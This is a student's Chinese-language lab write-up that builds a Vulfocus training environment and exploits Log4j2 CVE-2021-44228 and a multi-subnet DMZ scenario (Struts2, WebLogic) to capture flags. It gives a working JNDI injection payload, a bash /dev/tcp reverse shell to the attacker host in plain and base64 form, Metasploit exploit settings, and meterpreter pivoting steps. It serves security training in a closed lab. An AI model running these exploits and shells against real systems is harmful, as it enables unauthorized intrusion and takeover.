# 2023暑期网络安全攻防实践记录报告


## 实验环境

- VMware Workstation Pro 17
- kali-linux-2023.2-vmware-amd64

## 实践过程

### 一、基础环境搭建

#### 1.配置虚拟机，调节网络环境

根据需要，本次实践中的虚拟机要配置两张网卡：`网络地址转换(NAT)` 网卡和 `Host-only` 网卡

<img src="img/virtualnetwork.png" alt="virtualnetwork" style="zoom:50%;" />

为了完成红蓝攻防对抗，就需要准备攻击者主机和靶机共两台虚拟机，如果是用 Virtualbox 的话就可以直接使用多重加载镜像来简化实验操作，但是我这里使用的是 VMware，不支持多重加载功能（貌似是Virtualbox独家特色），那就只能是自行准备两台 kali 虚拟机了。


#### 2.配置 ssh 免密登录，实现优雅操作虚拟机

- __操作过程：__ 

     - 打开 gitbash，输入操作代码：
     ```bash
     $ ssh-keygen -t rsa 
     # 提示输入东西时，连续按3次回车即可，在~/.ssh目录下生成了id_rsa和id_rsa.pub两个文件，后者上传至目标服务器。
     # 但是因为已经生成过密钥文件了，这里就跳过这一步，权当是复习一遍之前的内容。
     $ ssh-copy-id -i id_rsa.pub server_user@ipAddr
     #server_user是服务器用户名，ipAddr是对应地址。
     ```

     <img src="img/ssh_keygen.png" alt="ssh_keygen" style="zoom:50%;" />
     <img src="img/ssh-copy-id.png" alt="ssh-copy-id" style="zoom:50%;" />
     


     - 在虚拟机上进行输入操作代码：
     ```bash
     $ vim /etc/ssh/sshd_config
     #找到/etc/ssh/sshd_config这个文件，取消以下几行注释。
     #PubkeyAuthentication yes
     #AuthorizedKeysFile .ssh/authorized_keys
     保存并退出vim：:x

     $ sudo service ssh restart
     #重启服务
     ```

     <img src="img/sshd_config.png" alt="sshd_config" style="zoom:50%;" />
    

     - 在 gitbash 中输入操作代码：
     ```bash
     $ ssh username@ip
     ```
     即可免密登录虚拟机的 Linux 系统。
     <img src="img/ssh.png" alt="ssh" style="zoom:50%;" />

在宿主机上实现远程免密登录确实会让实验操作更加便捷。



#### 3.把攻防训练环境从仓库中拉取到虚拟机系统中


- 根据黄药师提供的[vulfocus纯净版 Kali 初始化基础环境快速上手指南](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus)进行环境搭建。

    ```bash
    $ git clone https://github.com/c4pr1c3/ctf-games.git
    ```


- 因为我在访问和拉取镜像时出现网络限制或者超时的问题，并且下载速度非常慢，于是就**更换了 kali 镜像源**：

  - 使用下列命令可以直接编辑`sources.list`

    ```css
    $ sudo vim /etc/apt/sources.list
    ```

  - 推荐的国内源地址如下：

    ```shell
    # 中科大
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
     
    # 阿里云
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
     
    # 清华大学
    deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    ```

- 保存上述更改后要更新软件源：

    ```bash
    $ sudo apt update 
    ```

- 通过使用 Docker Compose 来构造 docker 环境，其中 git 下来的仓库老师已经配置好对应的 .yml文件，直接执行即可构建对应的环境：

   ```bash
   $ sudo apt install -y docker.io docker-compose jq
    ```

- 将当前用户添加到 docker 用户组，免 sudo 执行 docker 相关指令：

    ```bash
    $ sudo usermod -a -G docker ${USER}
    ```

    然后重新登陆 shell 生效。

    <img src="img/unsudo_docker.png" alt="unsudo docker" style="zoom:50%;" />

- 切换到 root 用户权限下执行：

   ```bash
   $ sudo su -
   ``` 

- 同样为了保证网络的顺畅，需要**更换 docker 源**：

  - 修改 `/etc/docker/daemon.json` 文件：

    ```bash
    # 添加一些国内的镜像源
    $ cat <<EOF > /etc/docker/daemon.json
    {
      "registry-mirrors": ["https://registry.docker-cn.com",
        "http://hub-mirror.c.163.com",
        "https://docker.mirrors.ustc.edu.cn",
        "https://cr.console.aliyun.com",
        "https://mirror.ccs.tencentyun.com"]
    }
    EOF
    # 查看是否修改成功
    $ cat /etc/docker/daemon.json
    ```


  - 重启 docker 守护进程：

    ```bash
    $ systemctl restart docker
    ```

     <img src="img/daemon.png" alt="daemon" style="zoom:50%;" />

  - 查看配置是否成功：

    ```bash
    $ docker info
    ```

     <img src="img/dockerconfig.png" alt="dockerconfig" style="zoom:50%;" />


- 提前拉取 vulfocus 镜像：

    ```bash
    $ docker pull vulfocus/vulfocus:latest
    ```

    这就是一个纯等待的过程，所以前面换成国内镜像源那步很重要，可以大大减少等待的时间。

     <img src="img/pull_vulfocus.png" alt="pull_vulfocus" style="zoom:50%;" />


- pull 好后，直接运行老师给出的 `bash start.sh` 脚本，并选择对外提供访问 `vulfocus-web` 的 IP（这里选择的是 host-only 网卡的地址），即可在本地的 80 端口开启容器：

    <img src="img/container_build.png" alt="container_build" style="zoom:50%;" />


#### 4.测试部署本地的Vulfocus


- 打开浏览器访问进入部署好的地址，【镜像管理】-【镜像管理】-【一键同步】，能够看到 Vulfocus 已经提供的镜像：

    <img src="img/mirror_list.png" alt="mirror_list" style="zoom:50%;" />

- 搜索感兴趣的漏洞镜像-【下载】

    <img src="img/mirror_download.png" alt="mirror_download" style="zoom:50%;" />


- 镜像下载完毕后，【首页】，能够看到下载好的镜像列表等信息，并在容器中【启动】环境进行测试：


    <img src="img/download_list.png" alt="download_list" style="zoom:50%;" />

    <img src="img/test.png" alt="test" style="zoom:50%;" />


#### 5.自定义一个场景拓扑镜像

- 根据同学提供的情报得知：由于[官网](https://vulfocus.cn/#/scene/list)已经不再提供下载和资源镜像分享，因此需要自己去设计构建相应的拓扑场景和镜像：

  <img src="img/reason.png" alt="reason" style="zoom:50%;" />

- 这里有两种方式，
  - 第一：直接导入 rock 同学提前搭建好的镜像场景——手搓 dmz，并且下载需要的漏洞镜像。
  - 第二：自己手动搭建场景。

- 为了方便起见，我选择了第一种方式，【场景管理】-【环境编排管理】-【添加场景】- 选择提前下载好的`手搓dmz.zip` -【修改端口开放状态】-【保存】-【发布】-【下载所需要的镜像】。

  > 注意记得将第二层容器中端口开放更改为 `false`。

  <img src="img/alter_to_false.png" alt="alter_to_false" style="zoom:50%;" />

- 一共需要 3 种漏洞镜像：`struts2-cve-2020-17530`、`weblogic-cve-2019-2725`、`nginx-php-flag`。正常情况下，按照上述操作，此时我们需要做的就是静静等待它下载完成，需要一点耐心，因为它下载速度很慢。但是我下载的时候遇到了问题，`weblogic-cve-2019-2725` 该镜像的下载一直无法成功。我试过很多方法：重启虚拟机、重新导入场景、单独下载、更换镜像源...全部无济于事，下载进度一直卡在一个位置。

  <img src="img/stuck.png" alt="stuck" style="zoom:50%;" />

- 因为在这个地方我耗费了太多时间，心态崩溃，所以中间 gap 了两天。今天重振旗鼓，再次挑战。我想如果无法从这个网站上直接下载的话，那能不能用别的方式下载呢？在网上查找了一番资料，终于，根据 [Vulfocus 镜像维护目录](https://github.com/fofapro/vulfocus/blob/master/images/README.md)得知：可以直接在 docker 里面拉取漏洞镜像。

  ```bash
  $ docker pull vulfocus/weblogic-cve_2019_2725
  ```

- 这次，终于成功搭建好场景啦！

    <img src="img/scene.png" alt="scene" style="zoom:50%;" />


### 二、单个漏洞验证和利用

> 以 log4j2 CVE-2021-44228 为例

#### 1.找到靶标访问入口

- 在 Vulfocus 镜像管理中下载并且启动 `Log4j2远程命令执行（CVE-2021-44228）`：

  <img src="img/start_Log4j2.png" alt="start_Log4j2" style="zoom:50%;" />


- 打开浏览器，访问该地址 `http://192.168.98.131:51640`

  <img src="img/Log4j2_IP.png" alt="Log4j2_IP" style="zoom:50%;" />

#### 2.检测漏洞存在性

- 在靶机上查看容器名称

  ```bash
  $ docker ps
  ```

  <img src="img/container_name.png" alt="container_name" style="zoom:50%;" />

- 实验环境访问端口为 `51640`，故查看到容器名称为 `wizardly_brattain`，进入容器

  ```bash
  $ docker exec -it <容器名> bash
  $ ls
  ```

  <img src="img/IntoTheContainer.png" alt="IntoTheContainer" style="zoom:50%;" />


- 查看到容器目录下有 `demo.jar` 文件，拉取到容器的宿主机上

  ```bash
  # docker cp <容器名称或ID>:<容器内文件路径> <宿主机目标路径>
  $ sudo docker cp wizardly_brattain:/demo/demo.jar ./
  ```

    <img src="img/pull_jar.png" alt="pull_jar" style="zoom:50%;" />


- 使用 [jadx](https://github.com/skylot/jadx/releases/tag/v1.4.7) 反编译 `demo.jar`

  <img src="img/decompile_jar.png" alt="decompile_jar" style="zoom:50%;" />


- 源码中有名为 `Log4j2RceApplic` 的类，其中正是违反了 "KISS" 原则，验证了该漏洞存在

#### 3.验证漏洞可利用性

- 使用 `PoC` 手动测试

> "PoC" 是 "Proof of Concept" 的缩写，意为"概念验证"。在安全领域，PoC 手动测试通常用于验证潜在的漏洞或安全问题。测试人员会尝试利用已知的漏洞或攻击技术来测试系统的安全性，并验证是否存在潜在的风险。这种测试方法可以帮助发现和修复系统中的安全漏洞，以提高系统的安全性。

- 访问 `http://dnslog.cn/` 获取专属随机子域名 `5d7mp8.dnslog.cn`

  <img src="img/getdomain.png" alt="getdomain" style="zoom:50%;" />


- 浏览器访问 `192.168.98.131:51640/hello?payload=111` 地址，使用 Burp Suite 进行抓包，修改 `GET` 请求的 `payload` 参数

  ```
  # ldap://dnslog获取的随机域名/随便填
  payload=${jndi:ldap://5d7mp8.dnslog.cn/exp}
  ```

- 同时对 `payload` 字段进行**编码**，否则直接访问会导致 400 错误

  <img src="img/burpget.png" alt="burpget" style="zoom:50%;" />

- 在 DNSLog 网站成功接收到解析记录

  <img src="img/get_parsingrecord.png" alt="get_parsingrecord" style="zoom:50%;" />


#### 4.漏洞利用

- 攻击者主机 attacker 上下载 [JNDIExploit 工具](https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)

  ```bash
  $ git clone https://github.com/bkfish/Apache-Log4j-Learning.git
  # 解压
  $ unzip JNDIExploit.v1.2.zip
  ```


- 攻击者主机 attacker 启动 `7777` 端口，等待受害者主机 victim 反弹回连 getshell

  ```bash
  $ nc -l -p 7777
  ```

  <img src="img/start_ListeningPort.png" alt="start_ListeningPort" style="zoom:50%;" />


- 应用工具 `JNDI-Injection-Exploit` 搭建服务，格式：

  ```bash
  $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “IP（攻击机）”
  ```

- 这里的命令是想要靶机运行的命令，**"-A"** 后放的是攻击者主机的 IP，也是存放 **"-C"** 后“命令”的 IP 地址。

- 构造反弹 shell 的 `payload`

  ```bash
  $ bash -i >& /dev/tcp/192.168.98.130/7777 0>&1
  ```

- 将其进行 **base64加密**

  ```tex
  YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk4LjEzMC83Nzc3IDA+JjE=
  ```

- 执行JNDI-Injection-Exploit

  ```bash
  $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk4LjEzMC83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.98.130
  ```

  <img src="img/start_java_monitoring.png" alt="start_java_monitoring" style="zoom:50%;" />

- 使用 Burp Suite 进行抓包，修改 `GET 192.168.98.131:51640/hello?payload=111` 的 payload 参数为上图框选的内容并进行编码

  ```
  ${jndi:rmi://192.168.98.130:1099/tl0nul}
  ```

  <img src="img/Modify_payload.png" alt="Modify_payload" style="zoom:50%;" />


- 发送后，即可发现攻击者主机的监听窗口反弹 shell，查看 flag

  ```bash
  $ ls /tmp
  ```

  <img src="img/get_flag.png" alt="get_flag" style="zoom:50%;" />


  ```bash
  flag-{bmhfafb34e9-8cae-4c77-99cf-7c1ead47eea5}
  ```



### 三、场景化漏洞攻击

> 以【跨网段渗透(常见的dmz)】为例

#### 1.场景安装与配置

- 即在上面已经搭建好的 `手搓dmz` （双层网段的渗透测试环境）
- 进入【场景】，启动场景
- 阅读场景说明，找到场景入口地址，可以使用指令 `docker ps` 来查看当前运行的镜像信息，得到我们需要访问的端口号
- 打开浏览器，输入 `靶机IP:端口号`

  <img src="img/entrance_port.png" alt="entrance_port" style="zoom:50%;" />

#### 2.捕获指定容器的上下行流量

> 为后续的攻击过程「分析取证」保存流量数据

  ```bash
  $ docker ps # 先查看目标容器名称或ID
  $ container_name="<替换为目标容器名称或ID>"
  $ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
  ```
  
  <img src="img/tcpdump.png" alt="tcpdump" style="zoom:50%;" />

- 建议放到 tmux 会话中，然后放到后台运行

  <img src="img/tmux.png" alt="tmux" style="zoom:50%;" />


#### 3.攻破靶标1

- 切换到攻击者主机 attacker 进行 metasploit 基础配置

  > Metasploit 是一款用于渗透测试和漏洞利用的开源工具，旨在帮助安全专家评估和增强计算机系统、网络和应用程序的安全性。它是一个广泛使用的渗透测试框架，包含一个控制台界面，称为 Metasploit Console 或 msfconsole，以及一组命令行工具，用于执行各种渗透测试任务。Metasploit 还提供了一个巨大的漏洞数据库和利用代码库，使用户能够更容易地利用已知的漏洞。
  > Metasploit 可以帮助安全团队或个人测试计算机系统中的漏洞，并利用这些漏洞，以检查系统的安全性和脆弱性。该工具具有丰富的功能和模块，使渗透测试人员能够执行各种攻击，包括远程执行代码、获取系统权限、发现敏感数据等。

  ```bash
  # metasploit 基础配置
  # 更新 metasploit
  $ sudo apt install -y metasploit-framework
  # 初始化 metasploit 本地工作数据库
  $ sudo msfdb init
  # 启动 msfconsole
  $ msfconsole
  ```

  <img src="img/msfconsole.png" alt="msfconsole" style="zoom:50%;" />  
  
  ```bash
  # 确认已连接 pgsql
  $ db_status
  # 建立工作区
  $ workspace -a Cynthia
  ```

  <img src="img/db_workspace.png" alt="db_workspace" style="zoom:50%;" /> 

- 首先要收集服务识别与版本等信息，不断搜索并且完善关键词，最后找到我们所需的 **exp**：`exploit/multi/http/struts2_multi_eval_ognl`

  ```bash
  # search exp in metasploit
  $ search struts2 type:exploit
  # 查看 exp 详情
  # 可以直接通过搜索结果编号，也可以通过搜索结果的 Name 字段
  $ info <结果编号或 Name 字段>
  # 继续完善搜索关键词
  $ search S2-059 type:exploit
  ```

  <img src="img/search_exp.png" alt="search_exp" style="zoom:50%;" /> 


- 找到我们所需的 exp 后就选择使用，并且选择设置合适的 exp payload

  ```bash
  # 使用符合条件的 exp
  $ use exploit/multi/http/struts2_multi_eval_ognl

  # 查看可用 exp payloads
  $ show payloads

  # 使用合适的 exp payload
  $ set payload payload/cmd/unix/reverse_bash
  ```

  <img src="img/use_n_set_exp.png" alt="use_n_set_exp" style="zoom:50%;" /> 

- 查看并且配置 exp 参数，确保所有 `Required=yes` 参数均正确配置

  ```bash
  # 查看 exp 可配置参数列表
  $ show options
  # 靶机 IP
  $ set RHOSTS 192.168.98.131 
  # 靶机目标端口
  $ set rport  53746          
  # 攻击者主机 IP
  $ set LHOST  192.168.98.130 

  # 再次检查 exp 配置参数列表
  $ show options
  ```

  <img src="img/show_options.png" alt="show_options" style="zoom:50%;" />


  <img src="img/set_exp.png" alt="set_exp" style="zoom:50%;" />

- 接下进行 getshell，如果攻击成功，查看打开的 reverse shell，进入会话后，发现无命令行交互提示信息，此时我们试一试 Bash 指令，可以发现我们已经打下了第一个靶标，查看其 `/tmp` 目录，成功得到 `flag1`。

  ```bash
  # getshell
  $ exlpoit -j

  # 如果攻击成功，查看打开的 reverse shell
  $ sessions -l

  # 进入会话 1
  $ sessions -i 1

  # 无命令行交互提示信息，试一试 Bash 指令
  $ id
  # get flag-1
  $ ls /tmp
  # flag-{bmh22c0ab9a-dbef-44b3-a55d-3c448528ae0d}

  # 通过 CTRL-Z 将当前会话放到后台继续执行
  ```


  <img src="img/flag1.png" alt="flag1" style="zoom:50%;" />


#### 4.建立立足点并发现靶标2-4

- 升级会话 1 ，将普通的命令行（cmdshell）会话升级为 Meterpreter shell，对同一个主机新创建了一个会话，从而获得更强大的远程控制能力和更多的功能。

  ```bash 
  # upgrade cmdshell to meterpreter shell
  $ sessions -u 1

  # 查看新增的主机信息
  $ hosts

  # 进入 meterpreter 会话 2
  $ sessions -i 3
  ```

  <img src="img/upgrade_cmdshell.png" alt="upgrade_cmdshell" style="zoom:50%;" />

- 在实际环境中，我们通常会做一个端口扫描，在 metasploit 里可以使用 `db_nmap` 来进行扫描 `53746` 端口，也可以多扫描 80 端口、22 端口。

  ```bash 
  # 端口扫描
  $ db_nmap -p 53746,80,22 192.168.98 131 -A -T4 -n

  # 使用 db_nmap 的好处是在 services 里面能将结果直接导入到数据库中，可以随时看到我们的收获
  $ services

  # 查看主机信息，意外发现一个新的主机地址 192.171.84.4
  $ hosts
  ```

  <img src="img/db_nmap.png" alt="db_nmap" style="zoom:50%;" />

- 进入到会话 3 查看拓扑信息，发现其真正的内网地址是 `192.171.84.4`


  ```bash
  $ sessions -i 3

  # setup pivot: run autoroute
  # 查看网卡列表
  ipconfig

  # 查看路由表
  route

  # 查看 ARP 表
  arp
  ```

  <img src="img/ipconfig.png" alt="ipconfig" style="zoom:50%;" />


- 接下来，在会话 3 中将目标网段创建为我们当前主机的 Pivot 路由，可以通过会话 3 直接访问该网段，实现正向代理


  ```bash
  $ run autoroute -s 192.171.84.0/24

  # 检查 Pivot 路由是否已创建成功
  $ run autoroute -p
  ```

  <img src="img/autoroute.png" alt="autoroute" style="zoom:50%;" />

- 退出 Meterpreter shell，搜索 `portscan`，选择 `auxiliary/scanner/portscan/tcp` 来进行端口扫描

  ```bash
  # portscan through pivot
  $ search portscan
  $ use auxiliary/scanner/portscan/tcp
  # 查看可用参数
  $ show options
  ```

  <img src="img/portscan.png" alt="portscan" style="zoom:50%;" />


- 配置需要的参数，因为我们知道此处开放 `7001` 端口，所以就只设置该端口号，在实际中就要去根据我们的经验进行猜测

  ```bash
  # 根据子网掩码推导
  $ set RHOSTS 192.171.84.2-254
  # 根据「经验」
  $ set rport 7001
  # 根据「经验」
  $ set threads 10
  ```

  <img src="img/set_portscan.png" alt="set_portscan" style="zoom:50%;" />

- 开始扫描，等扫描结果出来后可以发现，三台主机确实存活，`7001` 端口 tcp 是开放的
  
  ```bash
  # 开始扫描
  $ exploit -j

  # 等到扫描结果 100%
  # 查看主机存活情况
  $ hosts

  # 查看发现的服务列表
  $ services
  ```

  <img src="img/exploit_portscan.png" alt="exploit_portscan" style="zoom:50%;" />

- 搜索 `socks_proxy`，使用该代理模块，该代理模块就能在攻击者主机上开启一个利用当前立足点会话建立起的一个跳板

  ```bash
  # setup socks5 proxy 
  $ search socks_proxy
  $ use auxiliary/server/socks_proxy
  $ run -j
  # 查看后台任务
  $ jobs -l
  ```

  <img src="img/exploit_socks_proxy.png" alt="exploit_socks_proxy" style="zoom:50%;" />


- 新开一个 ssh 会话窗口连接到攻击者主机上，查看端口监听情况，可以看到 `1080` 端口确实开启了一个 socks 代理

  ```bash
  # 检查 1080 端口服务开放情况
  $ sudo lsof -i tcp:1080 -l -n -P
  ```

  <img src="img/port1080.png" alt="port1080" style="zoom:50%;" />


- 编辑 `/etc/proxychains4.conf`，进行 tcp 连接扫描 `7001` 端口；虽然扫描输出的结果是 `filtered`，但其实是处于开放状态的

  ```bash
  $ sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf

  $ proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.171.84.2-5
  ```

- 可以通过以下几个指令以此验证，可以发现出现了 `404` 错误，也说明网络层是连通的，而应用层我们只是请求了一个不存在的地址而已，这样我们就发现了靶标2-4了

  ```bash
  # 回到 metasploit 会话窗口
  # 重新进入 shell 会话
  sessions -i 1
  curl http://192.170.84.2:7001 -vv
  curl http://192.170.84.3:7001 -vv
  curl http://192.170.84.4:7001 -vv
  ```

  <img src="img/curl404.png" alt="curl404" style="zoom:50%;" />


#### 5.攻破靶标2-4

- 搜索 `cve-2019-2725`，加载漏洞利用程序，同样还是要设置所需要的参数

  ```bash
  # search exploit
  $ search cve-2019-2725

  # getshell
  $ use 0
  $ show options

  # 批量设置靶机 IP
  $ set RHOSTS 192.171.84.2-5
  
  $ set lhost 192.168.98.130

  # run
  $  run -j
  ```

  <img src="img/search_cve-2019-2725.png" alt="search_cve-2019-2725" style="zoom:50%;" />



- 进入会话中，查看 `/tmp` 目录，成功找到 `flag2-4`
  
  ```bash
  # get flag2-4
  $ sessions -c "ls /tmp" -i 6,7,8
  ```

  <img src="img/flag2-4.png" alt="flag2-4" style="zoom:50%;" />



#### 6.发现并攻破终点靶标5

- 有一台靶机是双网卡的，我们需要找到那台有双网卡的靶机，通过网卡、路由、ARP 成功发现最深层次的内网 `192.172.85.0/24`
 
   ```bash
  # 通过网卡、路由、ARP 发现新子网 192.172.85.0/24
  $ sessions -c "ifconfig" -i 6,7,8

  # portscan through pivot
  # 将会话 8 （IP地址为192.171.84.5）升级为 meterpreter shell
  $ sessions -u 8
  # 新的 meterpreter shell 会话编号此处为 10
  $ sessions -i 10
  ```

  <img src="img/session10.png" alt="session10" style="zoom:50%;" />


- 我们可以直接在 meterpreter shell 中直接访问 IP 地址来进行枚举测试

  ```bash
  # 利用跳板机 192.171.84.5 的 meterpreter shell 会话「踩点」最终靶标
  $ curl http://192.172.85.2
  # 发现没安装 curl ，试试 wget
  $ wget http://192.172.85.2
  # 发现没有命令执行回显，试试组合命令
  $ wget http://192.172.85.2 -O /tmp/result && cat /tmp/result
  ```

  <img src="img/flag_hint.png" alt="flag_hint" style="zoom:50%;" />

- 得到输出结果，并且提示我们需要通过 `index.php?cmd=ls /tmp` 的方式执行，最后成功得到 `flag5`
  
  ```bash
  # 发现 get flag 提示
  $ wget 'http://192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/result"
  # index.php?cmd=ls /tmpflag-{bmh6b110165-c5c5-4cc0-9079-f6d3305738c63}
  ```

  <img src="img/flag5.png" alt="flag5" style="zoom:50%;" />


功夫不负有心人！终于攻破了该多网段渗透场景！

<img src="img/completed.png" alt="completed" style="zoom:50%;" />



## 参考链接

- [网络安全(2021)综合实验](https://www.bilibili.com/video/BV1p3411x7da/?p=22&spm_id_from=pageDriver&vd_source=61a1cf010feeebc60643481f16fc695e)

- [cuc-ns-ppt](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/title-slide)

- [Vulfocus 镜像维护目录](https://github.com/fofapro/vulfocus/blob/master/images/README.md)